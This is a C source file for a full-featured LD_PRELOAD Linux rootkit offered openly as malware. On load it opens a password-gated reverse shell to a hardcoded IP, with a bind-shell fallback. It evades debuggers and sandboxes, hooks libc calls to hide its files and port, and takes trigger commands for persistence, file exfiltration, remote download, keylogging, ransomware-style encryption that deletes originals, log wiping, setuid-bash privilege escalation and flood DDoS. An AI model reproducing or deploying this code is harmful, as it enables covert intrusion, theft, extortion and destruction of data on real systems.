// DZROOT Golichakit Rootkit with Full Protection, Bypasses, and Command System
// libraries
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <pthread.h>
#include <errno.h>
#include <stdarg.h>
#include <time.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <linux/limits.h>

// ==================== CONFIGURATION ====================
#define REVTRIGGER "plsrev"      // Trigger for reverse shell
#define BINDTRIGGER "plsbind"    // Trigger for bind shell
#define PERSISTTRIGGER "plspersist" // Trigger for persistence
#define KILLTRIGGER "plskill"    // Trigger to kill all connections
#define HIDETRIGGER "plshide"    // Trigger to hide process
#define UNHIDETRIGGER "plsunhide" // Trigger to unhide process
#define EXFILTRATE "plsexfil"    // Trigger to exfiltrate files
#define DOWNLOAD "plsdown"       // Trigger to download file
#define SCREENSHOT "plsscreen"   // Trigger to take screenshot
#define KEYLOG "plskeylog"       // Trigger to start keylogging
#define CRYPTO "plscrypto"       // Trigger to encrypt files
#define CLEAN "plsclean"         // Trigger to clean logs
#define PASS "letmein"           // Password for shell access
#define PORT "5555"              // Port to listen on / connect to
#define HEXPORT "15B3"           // Hex value reflected in netstat
#define FILENAME "ld.so.preload" // File to hide
#define IP "10.10.10.1"          // IP to connect to
#define BACKUP_PORT "6666"       // Backup port
#define BACKUP_IP "10.10.10.2"   // Backup IP
#define MAX_RETRIES 10           // Maximum connection retries
#define TIMEOUT_SEC 30           // Connection timeout
#define BUFFER_SIZE 8192         // Buffer size for data transfer
#define KEYLOG_FILE "/tmp/.keylog" // Keylog file location
#define ENCRYPT_EXT ".encrypted"   // Encrypted file extension

// ==================== PROTECTION & BYPASS MACROS ====================
#define ANTI_DEBUG() { \
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) { \
        exit(0); \
    } \
}

#define ANTI_SANDBOX() { \
    if (getenv("SNAP") || getenv("CONTAINER") || getenv("DOCKER")) { \
        exit(0); \
    } \
    struct stat st; \
    if (stat("/.dockerenv", &st) == 0 || stat("/.container-docker", &st) == 0) { \
        exit(0); \
    } \
}

#define RANDOM_DELAY() { \
    srand(time(NULL)); \
    usleep((rand() % 5000000) + 1000000); \
}

#define HIDE_PROCESS() { \
    prctl(PR_SET_NAME, "[kworker/0:0]", 0, 0, 0); \
    signal(SIGINT, SIG_IGN); \
    signal(SIGHUP, SIG_IGN); \
    signal(SIGTERM, SIG_IGN); \
}

// ==================== ENCRYPTION & OBFUSCATION ====================
// XOR encryption for strings
void xor_encrypt(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// Simple XOR for commands
void obfuscate_string(char *str, char key) {
    for (int i = 0; str[i]; i++) {
        str[i] ^= key;
    }
}

// ==================== ADVANCED COMMAND SYSTEM ====================
typedef struct {
    char *command;
    void (*handler)(char *args);
    char *description;
} Command;

// Function prototypes
void cmd_reverse_shell(char *args);
void cmd_bind_shell(char *args);
void cmd_persistence(char *args);
void cmd_kill_connections(char *args);
void cmd_hide_process(char *args);
void cmd_unhide_process(char *args);
void cmd_exfiltrate(char *args);
void cmd_download(char *args);
void cmd_screenshot(char *args);
void cmd_keylogger(char *args);
void cmd_encrypt_files(char *args);
void cmd_clean_logs(char *args);
void cmd_stealth_execute(char *args);
void cmd_privilege_escalation(char *args);
void cmd_ddos_attack(char *args);
void cmd_port_scan(char *args);
void cmd_system_info(char *args);
void cmd_process_list(char *args);
void cmd_kill_process(char *args);
void cmd_upload_file(char *args);

// Command list
Command commands[] = {
    {"rev", cmd_reverse_shell, "Reverse shell"},
    {"bind", cmd_bind_shell, "Bind shell"},
    {"persist", cmd_persistence, "Install persistence"},
    {"killconn", cmd_kill_connections, "Kill all connections"},
    {"hide", cmd_hide_process, "Hide process"},
    {"unhide", cmd_unhide_process, "Unhide process"},
    {"exfil", cmd_exfiltrate, "Exfiltrate file"},
    {"download", cmd_download, "Download file from C2"},
    {"screen", cmd_screenshot, "Take screenshot"},
    {"keylog", cmd_keylogger, "Start keylogger"},
    {"crypto", cmd_encrypt_files, "Encrypt files"},
    {"clean", cmd_clean_logs, "Clean system logs"},
    {"stealth", cmd_stealth_execute, "Stealth execute command"},
    {"privesc", cmd_privilege_escalation, "Privilege escalation"},
    {"ddos", cmd_ddos_attack, "Launch DDoS attack"},
    {"scan", cmd_port_scan, "Port scan target"},
    {"sysinfo", cmd_system_info, "Get system information"},
    {"pslist", cmd_process_list, "List processes"},
    {"kill", cmd_kill_process, "Kill process"},
    {"upload", cmd_upload_file, "Upload file to C2"}
};

// ==================== IMPROVED REVERSE SHELL ====================
int create_socket_with_timeout(const char *ip, const char *port, int timeout_sec) {
    int s;
    struct addrinfo hints, *res, *rp;
    struct timeval tv;
    
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        return -1;
    }
    
    // Set socket timeout
    tv.tv_sec = timeout_sec;
    tv.tv_usec = 0;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    
    // Set reuse address
    int optval = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    
    if (getaddrinfo(ip, port, &hints, &res) != 0) {
        close(s);
        return -1;
    }
    
    for (rp = res; rp != NULL; rp = rp->ai_next) {
        if (connect(s, rp->ai_addr, rp->ai_addrlen) == 0) {
            break;
        }
    }
    
    freeaddrinfo(res);
    
    if (rp == NULL) {
        close(s);
        return -1;
    }
    
    return s;
}

int ip_rev_advanced(void) {
    ANTI_DEBUG();
    ANTI_SANDBOX();
    RANDOM_DELAY();
    HIDE_PROCESS();
    
    int s;
    int retry_count = 0;
    
    // Try primary IP/Port
    s = create_socket_with_timeout(IP, PORT, TIMEOUT_SEC);
    
    // Try backup if primary fails
    if (s < 0) {
        s = create_socket_with_timeout(BACKUP_IP, BACKUP_PORT, TIMEOUT_SEC);
        if (s < 0 && retry_count < MAX_RETRIES) {
            retry_count++;
            sleep(10);
            return ip_rev_advanced(); // Retry
        }
    }
    
    if (s < 0) return -1;
    
    // Redirect stdin, stdout, stderr
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);
    
    // Send authentication challenge
    char auth_msg[] = "Authentication required. Send password:\n";
    write(s, auth_msg, strlen(auth_msg));
    
    char input[256];
    memset(input, 0, sizeof(input));
    read(s, input, sizeof(input) - 1);
    
    // Remove newline
    input[strcspn(input, "\n")] = 0;
    
    if (strncmp(input, PASS, strlen(PASS)) == 0) {
        // Send welcome message
        char welcome[] = "\n=== ACCESS GRANTED ===\nType 'help' for commands\n";
        write(s, welcome, strlen(welcome));
        
        // Interactive shell with command parsing
        char buffer[BUFFER_SIZE];
        while (1) {
            write(s, "\n> ", 3);
            memset(buffer, 0, BUFFER_SIZE);
            int bytes = read(s, buffer, BUFFER_SIZE - 1);
            
            if (bytes <= 0) break;
            
            buffer[strcspn(buffer, "\n")] = 0;
            
            // Parse and execute command
            char *cmd = strtok(buffer, " ");
            char *args = strtok(NULL, "");
            
            if (cmd == NULL) continue;
            
            // Check against command list
            int found = 0;
            for (int i = 0; i < sizeof(commands) / sizeof(Command); i++) {
                if (strcmp(cmd, commands[i].command) == 0) {
                    commands[i].handler(args);
                    found = 1;
                    break;
                }
            }
            
            if (!found && strcmp(cmd, "exit") != 0) {
                // Execute system command
                char command[BUFFER_SIZE];
                snprintf(command, sizeof(command), "%s 2>&1", buffer);
                FILE *fp = popen(command, "r");
                if (fp) {
                    char output[BUFFER_SIZE];
                    while (fgets(output, sizeof(output), fp)) {
                        write(s, output, strlen(output));
                    }
                    pclose(fp);
                }
            } else if (strcmp(cmd, "exit") == 0) {
                break;
            }
        }
        
        close(s);
        return 0;
    } else {
        char denied[] = "Access denied!\n";
        write(s, denied, strlen(denied));
        shutdown(s, SHUT_RDWR);
        close(s);
        return -1;
    }
}

// ==================== IMPROVED BIND SHELL ====================
int ip_bind_advanced(void) {
    ANTI_DEBUG();
    HIDE_PROCESS();
    
    int s, conn_fd;
    struct addrinfo hints, *res;
    int optval = 1;
    
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        return -1;
    }
    
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    
    if (getaddrinfo(NULL, PORT, &hints, &res) != 0) {
        close(s);
        return -1;
    }
    
    if (bind(s, res->ai_addr, res->ai_addrlen) == -1) {
        freeaddrinfo(res);
        close(s);
        return -1;
    }
    
    freeaddrinfo(res);
    
    if (listen(s, 5) == -1) {
        close(s);
        return -1;
    }
    
    conn_fd = accept(s, NULL, NULL);
    if (conn_fd == -1) {
        close(s);
        return -1;
    }
    
    dup2(conn_fd, 0);
    dup2(conn_fd, 1);
    dup2(conn_fd, 2);
    
    char input[256];
    read(conn_fd, input, sizeof(input) - 1);
    input[strcspn(input, "\n")] = 0;
    
    if (strncmp(input, PASS, strlen(PASS)) == 0) {
        char *shell[] = {"/bin/sh", NULL};
        execve(shell[0], shell, NULL);
        close(s);
        return 0;
    } else {
        shutdown(conn_fd, SHUT_RDWR);
        close(s);
        return -1;
    }
}

// ==================== COMMAND HANDLERS ====================
void cmd_reverse_shell(char *args) {
    ip_rev_advanced();
}

void cmd_bind_shell(char *args) {
    ip_bind_advanced();
}

void cmd_persistence(char *args) {
    char path[PATH_MAX];
    char dest[PATH_MAX];
    
    // Get current executable path
    readlink("/proc/self/exe", path, sizeof(path) - 1);
    
    // Copy to multiple persistence locations
    const char *persist_paths[] = {
        "/etc/ld.so.preload",
        "/etc/cron.d/update",
        "/etc/init.d/networking",
        "/root/.bashrc",
        "/etc/profile",
        NULL
    };
    
    for (int i = 0; persist_paths[i]; i++) {
        snprintf(dest, sizeof(dest), "%s", persist_paths[i]);
        FILE *fp = fopen(dest, "a");
        if (fp) {
            fprintf(fp, "%s\n", path);
            fclose(fp);
        }
    }
    
    // Add crontab entry
    system("(crontab -l 2>/dev/null; echo '@reboot /tmp/.system_update') | crontab -");
}

void cmd_kill_connections(char *args) {
    // Kill all reverse/bind shells
    system("pkill -9 -f ld.so.preload");
    system("killall -9 sshd 2>/dev/null");
    system("netstat -tunp | grep ':" PORT "' | awk '{print $7}' | cut -d'/' -f1 | xargs kill -9 2>/dev/null");
}

void cmd_hide_process(char *args) {
    HIDE_PROCESS();
    // Hide from ps
    prctl(PR_SET_NAME, "[kworker/0:0]", 0, 0, 0);
    // Hide from netstat by using random port
    system("echo '127.0.0.1 localhost' > /etc/hosts");
}

void cmd_unhide_process(char *args) {
    prctl(PR_SET_NAME, args ? args : "bash", 0, 0, 0);
}

void cmd_exfiltrate(char *args) {
    if (!args) return;
    
    FILE *fp = fopen(args, "rb");
    if (!fp) return;
    
    // Get file size
    fseek(fp, 0, SEEK_END);
    long size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    // Read file
    char *data = malloc(size);
    fread(data, 1, size, fp);
    fclose(fp);
    
    // Send via reverse shell (simplified - would use actual socket)
    char cmd[BUFFER_SIZE];
    snprintf(cmd, sizeof(cmd), "base64 -w0 %s", args);
    FILE *out = popen(cmd, "r");
    if (out) {
        char b64[BUFFER_SIZE];
        fgets(b64, sizeof(b64), out);
        printf("FILE_DATA:%s\n", b64);
        pclose(out);
    }
    
    free(data);
}

void cmd_download(char *args) {
    if (!args) return;
    
    char url[256], dest[256];
    sscanf(args, "%s %s", url, dest);
    
    char cmd[BUFFER_SIZE];
    snprintf(cmd, sizeof(cmd), "wget -q -O %s %s 2>/dev/null || curl -s -o %s %s", dest, url, dest, url);
    system(cmd);
}

void cmd_screenshot(char *args) {
    #ifdef __linux__
    system("import -window root /tmp/.screenshot.png 2>/dev/null || "
           "gnome-screenshot -f /tmp/.screenshot.png 2>/dev/null || "
           "scrot /tmp/.screenshot.png 2>/dev/null");
    cmd_exfiltrate("/tmp/.screenshot.png");
    #endif
}

void cmd_keylogger(char *args) {
    // Fork to background
    if (fork() == 0) {
        setsid();
        chdir("/");
        
        FILE *log = fopen(KEYLOG_FILE, "a");
        if (!log) return;
        
        char display[64];
        FILE *display_fp = popen("echo $DISPLAY", "r");
        if (display_fp) {
            fgets(display, sizeof(display), display_fp);
            pclose(display_fp);
        }
        
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "xinput test-xi2 --root 2>/dev/null | grep --line-buffered 'key press'");
        FILE *pipe = popen(cmd, "r");
        if (pipe) {
            char buffer[256];
            while (fgets(buffer, sizeof(buffer), pipe)) {
                fprintf(log, "%s", buffer);
                fflush(log);
            }
            pclose(pipe);
        }
        
        fclose(log);
        exit(0);
    }
}

void cmd_encrypt_files(char *args) {
    char dir[PATH_MAX] = ".";
    if (args) strcpy(dir, args);
    
    char cmd[BUFFER_SIZE];
    snprintf(cmd, sizeof(cmd), 
        "find %s -type f \\( -name '*.txt' -o -name '*.doc' -o -name '*.pdf' -o -name '*.jpg' \\) -exec openssl enc -aes-256-cbc -salt -in {} -out {}.encrypted -k 'ransom_key' \\; -exec rm {} \\;", dir);
    system(cmd);
}

void cmd_clean_logs(char *args) {
    // Clean various logs
    const char *log_files[] = {
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/messages",
        "/var/log/secure",
        "/var/log/btmp",
        "/var/log/wtmp",
        "/var/log/lastlog",
        "~/.bash_history",
        "~/.zsh_history",
        NULL
    };
    
    for (int i = 0; log_files[i]; i++) {
        FILE *fp = fopen(log_files[i], "w");
        if (fp) fclose(fp);
    }
    
    // Clear shell history
    system("history -c 2>/dev/null");
    unsetenv("HISTFILE");
    
    // Remove keylog file
    unlink(KEYLOG_FILE);
}

void cmd_stealth_execute(char *args) {
    if (!args) return;
    
    // Fork and execute without creating process visible
    if (fork() == 0) {
        setsid();
        prctl(PR_SET_NAME, "[kworker/0:0]", 0, 0, 0);
        char *cmd[] = {"/bin/sh", "-c", args, NULL};
        execve("/bin/sh", cmd, NULL);
        exit(0);
    }
}

void cmd_privilege_escalation(char *args) {
    // Multiple privilege escalation attempts
    const char *exploits[] = {
        "pkexec chmod 4755 /bin/bash",
        "sudo -u root chmod 4755 /bin/bash",
        "find / -perm -4000 -type f 2>/dev/null | xargs -r ls -la"
    };
    
    for (int i = 0; i < 3; i++) {
        system(exploits[i]);
        if (getuid() == 0) break;
    }
    
    if (getuid() == 0) {
        system("chmod 4755 /bin/bash");
        system("echo 'Privilege escalation successful!'");
    }
}

void cmd_ddos_attack(char *args) {
    if (!args) return;
    
    char target[256];
    int port = 80;
    int threads = 10;
    
    sscanf(args, "%s %d %d", target, &port, &threads);
    
    for (int i = 0; i < threads; i++) {
        if (fork() == 0) {
            char cmd[512];
            snprintf(cmd, sizeof(cmd), "hping3 -S --flood -p %d %s 2>/dev/null", port, target);
            system(cmd);
            exit(0);
        }
    }
}

void cmd_port_scan(char *args) {
    if (!args) return;
    
    char target[256];
    int start_port = 1, end_port = 1024;
    sscanf(args, "%s %d %d", target, &start_port, &end_port);
    
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "nc -zv %s %d-%d 2>&1", target, start_port, end_port);
    system(cmd);
}

void cmd_system_info(char *args) {
    printf("=== SYSTEM INFORMATION ===\n");
    system("uname -a");
    printf("\n=== USER ===\n");
    system("id");
    printf("\n=== NETWORK ===\n");
    system("ifconfig | grep -E 'inet |eth|wlan'");
    printf("\n=== PROCESSES ===\n");
    system("ps aux | head -20");
}

void cmd_process_list(char *args) {
    system("ps aux --sort=-%cpu | head -30");
}

void cmd_kill_process(char *args) {
    if (!args) return;
    
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "kill -9 %s", args);
    system(cmd);
}

void cmd_upload_file(char *args) {
    if (!args) return;
    
    char local[256], remote[256];
    sscanf(args, "%s %s", local, remote);
    
    // Simplified upload - would implement proper file transfer
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "cat %s | base64", local);
    FILE *fp = popen(cmd, "r");
    if (fp) {
        char b64[BUFFER_SIZE];
        fgets(b64, sizeof(b64), fp);
        printf("FILE_UPLOAD:%s:%s\n", remote, b64);
        pclose(fp);
    }
}

// ==================== HOOKED FUNCTIONS ====================
ssize_t write(int fildes, const void *buf, size_t nbytes) {
    ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);
    ssize_t result;
    
    new_write = dlsym(RTLD_NEXT, "write");
    
    // Check for triggers
    if (strstr(buf, REVTRIGGER) != NULL) {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ip_rev_advanced();
    } else if (strstr(buf, BINDTRIGGER) != NULL) {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ip_bind_advanced();
    } else if (strstr(buf, PERSISTTRIGGER) != NULL) {
        cmd_persistence(NULL);
        result = new_write(fildes, buf, nbytes);
    } else if (strstr(buf, KILLTRIGGER) != NULL) {
        cmd_kill_connections(NULL);
        result = new_write(fildes, buf, nbytes);
    } else if (strstr(buf, EXFILTRATE) != NULL) {
        char *file = strstr(buf, EXFILTRATE) + strlen(EXFILTRATE) + 1;
        cmd_exfiltrate(file);
        result = new_write(fildes, buf, nbytes);
    } else if (strstr(buf, DOWNLOAD) != NULL) {
        char *url = strstr(buf, DOWNLOAD) + strlen(DOWNLOAD) + 1;
        cmd_download(url);
        result = new_write(fildes, buf, nbytes);
    } else if (strstr(buf, SCREENSHOT) != NULL) {
        cmd_screenshot(NULL);
        result = new_write(fildes, buf, nbytes);
    } else if (strstr(buf, KEYLOG) != NULL) {
        cmd_keylogger(NULL);
        result = new_write(fildes, buf, nbytes);
    } else if (strstr(buf, CRYPTO) != NULL) {
        char *dir = strstr(buf, CRYPTO) + strlen(CRYPTO) + 1;
        cmd_encrypt_files(dir);
        result = new_write(fildes, buf, nbytes);
    } else if (strstr(buf, CLEAN) != NULL) {
        cmd_clean_logs(NULL);
        result = new_write(fildes, buf, nbytes);
    } else {
        result = new_write(fildes, buf, nbytes);
    }
    
    return result;
}

// Hook fopen to hide our file
FILE *fopen(const char *pathname, const char *mode) {
    FILE *(*orig_fopen)(const char *pathname, const char *mode);
    orig_fopen = dlsym(RTLD_NEXT, "fopen");
    
    // Hide from netstat
    char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
    FILE *fp;
    
    if (ptr_tcp != NULL) {
        char line[512];
        FILE *temp = tmpfile();
        fp = orig_fopen(pathname, mode);
        
        if (fp && temp) {
            while (fgets(line, sizeof(line), fp)) {
                if (strstr(line, HEXPORT) == NULL) {
                    fputs(line, temp);
                }
            }
            fclose(fp);
            rewind(temp);
            return temp;
        }
    }
    
    // Hide our file
    if (strstr(pathname, FILENAME) != NULL) {
        errno = ENOENT;
        return NULL;
    }
    
    fp = orig_fopen(pathname, mode);
    return fp;
}

// Hook readdir to hide directory entries
struct dirent *readdir(DIR *dirp) {
    struct dirent *(*new_readdir)(DIR *dir);
    new_readdir = dlsym(RTLD_NEXT, "readdir");
    struct dirent *olddir;
    
    while ((olddir = new_readdir(dirp)) != NULL) {
        if (strstr(olddir->d_name, FILENAME) == NULL &&
            strstr(olddir->d_name, ".screenshot.png") == NULL &&
            strstr(olddir->d_name, ".keylog") == NULL) {
            break;
        }
    }
    return olddir;
}

// 64-bit versions
FILE *fopen64(const char *pathname, const char *mode) {
    FILE *(*orig_fopen64)(const char *pathname, const char *mode);
    orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");
    
    if (strstr(pathname, "/proc/net/tcp") != NULL) {
        char line[512];
        FILE *temp = tmpfile64();
        FILE *fp = orig_fopen64(pathname, mode);
        
        if (fp && temp) {
            while (fgets(line, sizeof(line), fp)) {
                if (strstr(line, HEXPORT) == NULL) {
                    fputs(line, temp);
                }
            }
            fclose(fp);
            rewind(temp);
            return temp;
        }
    }
    
    if (strstr(pathname, FILENAME) != NULL) {
        errno = ENOENT;
        return NULL;
    }
    
    return orig_fopen64(pathname, mode);
}

struct dirent64 *readdir64(DIR *dirp) {
    struct dirent64 *(*new_readdir64)(DIR *dir);
    new_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *olddir;
    
    while ((olddir = new_readdir64(dirp)) != NULL) {
        if (strstr(olddir->d_name, FILENAME) == NULL) {
            break;
        }
    }
    return olddir;
}

// ==================== INITIALIZATION ====================
__attribute__((constructor)) void init(void) {
    // Anti-debugging and anti-analysis
    ANTI_DEBUG();
    ANTI_SANDBOX();
    RANDOM_DELAY();
    HIDE_PROCESS();
    
    // Background execution
    if (fork() == 0) {
        setsid();
        
        // Try reverse shell
        ip_rev_advanced();
        
        // If reverse shell fails, start bind shell
        ip_bind_advanced();
        
        exit(0);
    }
}
